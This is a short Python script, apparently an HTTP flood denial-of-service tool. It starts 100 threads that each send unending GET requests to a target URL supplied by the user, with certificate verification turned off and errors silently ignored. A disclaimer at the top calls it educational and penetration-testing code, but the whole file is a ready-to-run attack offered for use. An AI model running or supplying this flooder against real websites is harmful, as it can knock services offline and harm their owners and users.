"""
This script is purely for educational/penetration testing purposes.

I am not responsible for any potential damage caused, it is the user's responsibility to make the right decisions.

"""

import requests
import time
import sys
import threading
from itertools import count
from colorama import Fore
import ssl
import warnings

warnings.filterwarnings("ignore")

ssl._create_default_https_context = ssl._create_unverified_context

def green(text):
    return Fore.GREEN + text + Fore.RESET

def make_request(url, count=count()):
    try:
        start_time = time.time()
        while True:
            code = requests.get(url, verify=False).status_code

            if code == 200:
                print(green(f"[+] request successful; total requests: {str(next(count) + 1)} in {round(time.time() - start_time)} seconds"))

            elif code == 404:
                print(green("[!] request failed: page not found"))
                exit()
    
            else:
                print(green(f"[!] request faied with code: {code}; continuing"))

    except Exception:
        pass

if __name__ == '__main__':
    try:
        threads = []
        try:
            url = sys.argv[1]

        except IndexError:
            url = input(green("\nenter the url of the target page: "))

        print(green("\n[*] initialising... please wait\n"))

        for i in range(100):
            t = threading.Thread(target=make_request, args=[url])
            t.daemon = True
            threads.append(t)

        for i in range(100):
            threads[i].start()
    
        for i in range(100):
            threads[i].join()

    except Exception:
        pass